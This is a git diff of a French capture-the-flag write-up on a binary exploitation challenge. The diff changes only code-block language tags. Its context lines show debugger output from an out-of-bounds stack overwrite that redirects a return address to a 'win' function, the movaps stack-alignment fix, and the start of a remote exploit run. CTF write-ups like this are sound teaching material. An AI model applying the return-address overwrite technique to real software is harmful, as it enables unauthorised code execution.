@@ -187,7 +187,7 @@ On peut reconnaitre plusieurs valeurs dans ce leak:
 
 On peut aller voir dans *gef* pour confirmer, avec la commande `vmmap` qui nous affiche les adresses et à quoi elle font référence,
 ici, `vmmap 0x0000555555557d88` nous montre que cette adresse apparient bel et bien au binaire:
-```
+```py
 Start              End                Size               Offset             Perm Path
 0x0000555555557000 0x0000555555558000 0x0000000000001000 0x0000000000002000 r-- /home/meisr/.../liberte_v2
 ```
@@ -197,7 +197,7 @@ Il nous reste plus qu'a trouver un moyen d'executer win.
 #### Execution de code
 
 Notre bug `"Out of bound"` se situe sur la stack donc là où sont stockées les adresses de retour des fonctions, si on regarde la stack sur *gef* avec la commande `telescope`, on peut trouver des adresses de retour qu'on pourrait réécrire avec notre bug:
-```
+```py
 +0x00 0x00007ffff7000061 'a' <- plainte 0
 +0x00 0x00007ffff7e3c3e3
 +0x01 0x0000000000000061 'a' <- plainte 1
@@ -273,15 +273,15 @@ Essayons le (avec gdb attaché au programme):
 Ah...
 
 Mettons un breakpoint sur l'instruction ret de `main_logic`:
-```
+```asm
 0x5555555556e6 c3                  <main_logic+0x60>   ret
-    0x555555555229 f30f1efa         <win>   endbr64
+    0x555555555229 f30f1efa            <win>   endbr64
     0x55555555522d 55                  <win+0x4>   push   rbp
 	...
 ```
 C'est bizarre, on appelle bel et bien win mais ça plante quand même.
 Si on continue instruction par instruction avec `ni`, on voit que le progamme meurt sur l'appelle de `system("cat /flag.txt")`, sur cette instruction:
-```x86
+```asm
 movaps XMMWORD PTR [rsp + 0x50], xmm0
 ```
 Avec quelque recherche, on tombe sur [movaps](https://www.felixcloutier.com/x86/movaps) qui nous explique que:
@@ -441,7 +441,7 @@ while True:
 
 ```
 
-```sh
+```
 $ python3 exploit.py REMOTE
 
 [+] exe: 0x0000556a1d8d1000
